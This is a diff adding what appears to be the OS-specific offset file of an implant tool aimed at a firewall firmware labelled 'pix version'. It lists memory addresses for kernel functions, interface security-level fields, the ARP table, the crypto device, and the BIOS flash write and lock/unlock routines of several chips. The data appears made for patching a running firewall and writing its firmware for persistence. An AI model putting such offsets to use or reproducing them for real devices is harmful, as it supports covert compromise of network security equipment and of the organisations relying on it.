@@ -1,0 +1,123 @@
+; This file provides OS-specific information.
+;
+; Lines that begin with a semi-colon are treated as comments.
+; Lines that being ":EOS:" indicate an end of a section.
+; Blank lines are NOT permitted.
+;
+; It's currently divided into two sections:
+;
+;	[Section I ] Configuration Data
+;	[Section II] LP-side Dynamic Data
+;
+; ------------------- START OF SECTION I --------------------------
+;
+; The first section contains information used during configuration.
+; The section has the following format:
+;
+;   * line 1: OS version line
+;   * line 2: Address for configuration information in a modified image
+;   * lines 3..n: Index & Value pairs
+;
+; All entries must be in hex.
+; (Any extra characters on a line are ignored.)
+;
+; The routine "bfl_readOsFile" is used to read the entire
+; first section of data.
+;
+0x611 			/* pix version */
+0x270800		/* config address in an os.bin
+0x0  0x80000E9c  	// allocb
+0x1  0x8000103c 	// freeb
+0x2  0x8000144c		// open
+0x3  0x800015c0    	// put
+0x4  0x800014d8		// close
+0x5  0x80214f94   	// atoip
+0x6  0x8020eed0		// memset
+0x7  0x80214918 	// memcpy
+0x8  0x802117dc		// malloc
+0x9  0x80211cc8		// free
+0xa  0x8020fc4c		// printf
+0xb  0x801ff5d8		// des_encrypt
+0xc  0x80215340		// isprint
+0xd  0x80200180		// des_set_key
+0xe  0x800a64bc		// sha
+0xf  0x80214478		// rand
+0x15  0x80002840      // process_create
+0x16  0x80003274      // process_suspend
+0x17  0x800032dc      // process_sleep_for
+0x18  0x801f5d1c      // show_process
+0x19  0x80003888      // bark
+0x1a  0x80469fa4      // cur_t
+0x2a  0x3c		// rptr
+0x2b  0x44		// wptr
+0x2c  0x18		// inIfc
+0x2d  0x50		// iftype
+0x30  0x80477B14	//zero_security_level
+0x31  0x80477b18	// zero_name
+0x32  0x80477af8	// zero_ip
+0x33  0x1cc		// length
+0x34  0x80473810	// num_nics
+0x35  0x80259880	// internal_clock
+0x36  0x804707c0        // addr of flash structure
+;
+; ------------------- END OF SECTION I ----------------------------
+;
+:EOS:
+;
+; ------------------- START OF SECTION II -------------------------
+;
+; The second section contains keyword-value pairs that
+; are set dynamically based on the current session/connection.
+;
+; Entries in this section will be obtained by keyword.
+; The format for each line is:
+;
+;   * keyword must begin in first column
+;   * keyword must be followed by at least one space (not tab)
+;   * value must be at least one character long
+;
+; The generic routine "bfl_fetchOsVal" will return a
+; pointer to the value associated with the supplied
+; keyword. The value is returned as a string containing
+; all of the characters following the keyword and
+; the first space character after the keyword.
+; It's up to the calling routine to interpret the result
+; appropriately.
+;
+; A convenience routine, "bfl_fetchOsUns", is provided
+; to simplify the retrieval of 32-bit values. This
+; routine uses strtoul to interpret the value.
+; The value is assumed to be a base 10 value unless preceded
+; with 0x (hex) or 0 (octal).
+; [See "strtoul" with a base parameter of zero.]
+; Callers of this routine don't have to worry about free'ing
+; memory.
+;
+InterfaceAddr          0x80477af8	/* matches entry 0x32 above */
+InterfaceLeng          0x11f8		/* 10 times entry 0x33 above */
+IntSecurityOffset      0x1c
+IntNameOffset          0x20
+MaxInterfaces          0x80473810      // matches entry 0x34 above
+FlashClassAddr         0x804707c0
+CryptoDeviceAddr       0x802598a0
+ArpTableAddrPtr        0x80246c6c      // addr of first entry in ARP table
+ArpTableLastPtr        0x804714cc      // addr of last entry in ARP table
+NumInterfaces          0x80473810      // addr of pointer to number of interfaces
+IfaceStruct2           0x804714d0      // addr of pointer to second smaller interface struct
+IfaceStruct2Len        0x44            // length of 2nd smaller interface struct used by arp cache
+BiosClassAddr          0x80470790      // addr of the bios class structure
+BiosWriteAddr1         0x8005FCCC      // addr of the bios write function for AT29C257 bios
+BiosWriteAddr2         0x8006383C      // addr of the bios write function for AM29F400B bios
+BiosWriteAddr3         0x80063E78      // addr of the bios write function for E28F400B5T bios
+BiosWriteAddr4         0x8006564c      // addr of the bios write function for DA28F320J5 bios
+BiosWriteAddr5         0x80065DD8      // addr of the bios write function for E28F640J3 bios
+BiosWriteOffset        0x00000020      // offset into the bios structure where write addr is located
+BiosReadE28F6          0x80065ab0      // addr of the bios read function for e28f640j3 chip
+BiosLockE28F6          0x80065fb8      // addr of the bios block lock/unlock function for e28f640j3 chip
+
+
+;
+; ------------------- END OF SECTION II ---------------------------
+;
+:EOS:
+;
